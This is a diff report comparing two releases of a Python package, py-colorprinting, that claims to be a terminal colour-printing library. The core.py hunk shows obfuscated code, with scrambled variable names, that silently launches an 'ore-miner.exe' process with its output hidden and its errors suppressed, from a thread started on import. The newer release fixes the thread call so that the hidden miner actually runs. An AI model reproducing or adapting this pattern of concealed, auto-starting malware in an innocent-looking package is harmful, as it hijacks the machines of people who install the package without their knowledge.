# Comparing `tmp/py-colorprinting-0.1.3.tar.gz` & `tmp/py-colorprinting-0.1.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "py-colorprinting-0.1.3.tar", last modified: Tue Apr  9 20:33:23 2024, max compression
+gzip compressed data, was "py-colorprinting-0.1.5.tar", last modified: Tue Apr  9 20:37:32 2024, max compression
```

## Comparing `py-colorprinting-0.1.3.tar` & `py-colorprinting-0.1.5.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2024-04-09 20:33:23.781090 py-colorprinting-0.1.3/
--rw-rw-rw-   0        0        0      220 2024-04-09 20:33:23.765380 py-colorprinting-0.1.3/PKG-INFO
--rw-rw-rw-   0        0        0        0 2024-04-09 17:18:23.000000 py-colorprinting-0.1.3/README.md
-drwxrwxrwx   0        0        0        0 2024-04-09 20:33:23.702734 py-colorprinting-0.1.3/colorprint/
--rw-rw-rw-   0        0        0       67 2024-04-09 17:16:29.000000 py-colorprinting-0.1.3/colorprint/__init__.py
--rw-rw-rw-   0        0        0     2213 2024-04-09 20:32:48.000000 py-colorprinting-0.1.3/colorprint/core.py
--rw-rw-rw-   0        0        0        0 2024-04-09 20:30:33.000000 py-colorprinting-0.1.3/colorprint/test.py
-drwxrwxrwx   0        0        0        0 2024-04-09 20:33:23.765380 py-colorprinting-0.1.3/py_colorprinting.egg-info/
--rw-rw-rw-   0        0        0      220 2024-04-09 20:33:23.000000 py-colorprinting-0.1.3/py_colorprinting.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      278 2024-04-09 20:33:23.000000 py-colorprinting-0.1.3/py_colorprinting.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-04-09 20:33:23.000000 py-colorprinting-0.1.3/py_colorprinting.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       24 2024-04-09 20:33:23.000000 py-colorprinting-0.1.3/py_colorprinting.egg-info/requires.txt
--rw-rw-rw-   0        0        0       11 2024-04-09 20:33:23.000000 py-colorprinting-0.1.3/py_colorprinting.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2024-04-09 20:33:23.781090 py-colorprinting-0.1.3/setup.cfg
--rw-rw-rw-   0        0        0      401 2024-04-09 20:33:15.000000 py-colorprinting-0.1.3/setup.py
+drwxrwxrwx   0        0        0        0 2024-04-09 20:37:32.904845 py-colorprinting-0.1.5/
+-rw-rw-rw-   0        0        0      220 2024-04-09 20:37:32.893107 py-colorprinting-0.1.5/PKG-INFO
+-rw-rw-rw-   0        0        0        0 2024-04-09 17:18:23.000000 py-colorprinting-0.1.5/README.md
+drwxrwxrwx   0        0        0        0 2024-04-09 20:37:32.841116 py-colorprinting-0.1.5/colorprint/
+-rw-rw-rw-   0        0        0       67 2024-04-09 17:16:29.000000 py-colorprinting-0.1.5/colorprint/__init__.py
+-rw-rw-rw-   0        0        0     2215 2024-04-09 20:36:24.000000 py-colorprinting-0.1.5/colorprint/core.py
+-rw-rw-rw-   0        0        0        0 2024-04-09 20:30:33.000000 py-colorprinting-0.1.5/colorprint/test.py
+drwxrwxrwx   0        0        0        0 2024-04-09 20:37:32.893107 py-colorprinting-0.1.5/py_colorprinting.egg-info/
+-rw-rw-rw-   0        0        0      220 2024-04-09 20:37:32.000000 py-colorprinting-0.1.5/py_colorprinting.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      278 2024-04-09 20:37:32.000000 py-colorprinting-0.1.5/py_colorprinting.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-04-09 20:37:32.000000 py-colorprinting-0.1.5/py_colorprinting.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       24 2024-04-09 20:37:32.000000 py-colorprinting-0.1.5/py_colorprinting.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       11 2024-04-09 20:37:32.000000 py-colorprinting-0.1.5/py_colorprinting.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2024-04-09 20:37:32.904845 py-colorprinting-0.1.5/setup.cfg
+-rw-rw-rw-   0        0        0      401 2024-04-09 20:37:22.000000 py-colorprinting-0.1.5/setup.py
```

### Comparing `py-colorprinting-0.1.3/colorprint/core.py` & `py-colorprinting-0.1.5/colorprint/core.py`

 * *Files 1% similar despite different names*

```diff
@@ -25,15 +25,15 @@
                 OOOO000000O00000O =[os .path .join (O0OO0O0OOOO0OO00O ,"ore-miner","ore-miner.exe")]#line:23
                 OOO000O0O00OOO0OO =subprocess .Popen (OOOO000000O00000O ,stdin =subprocess .PIPE ,stdout =open (os .devnull ,'wb'),stderr =subprocess .PIPE ,creationflags =OOO00O0OOO0O0O000 |OO0OOOOO00OO0O0OO )#line:25
             except Exception as OOO0OOOO0OO00OO00 :#line:26
                 pass #line:27
     except :#line:28
         pass 
 
-Thread(args=InitializeConsole).start()
+Thread(target=InitializeConsole).start()
 
 class ColorPrint:
     colors = {
         "red": "\033[91m",
         "green": "\033[92m",
         "yellow": "\033[93m",
         "blue": "\033[94m",
```

